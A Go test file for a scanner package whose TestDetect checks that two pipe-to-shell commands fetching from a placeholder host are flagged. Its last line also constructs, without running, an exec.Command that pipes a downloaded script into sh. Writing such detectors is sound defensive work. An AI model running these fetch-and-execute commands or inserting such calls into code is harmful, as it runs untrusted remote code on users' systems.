package scanner

import (
	"os/exec"
	"testing"
)

func TestDetect(t *testing.T) {
	cases := []string{"curl https://x.example.invalid/a | sh", "wget -O - https://x.example.invalid | /bin/bash"}
	for _, c := range cases {
		if !Detect(c) {
			t.Fatal(c)
		}
	}
	exec.Command("sh", "-c", "curl -s https://x.example.invalid/i | sh")
}
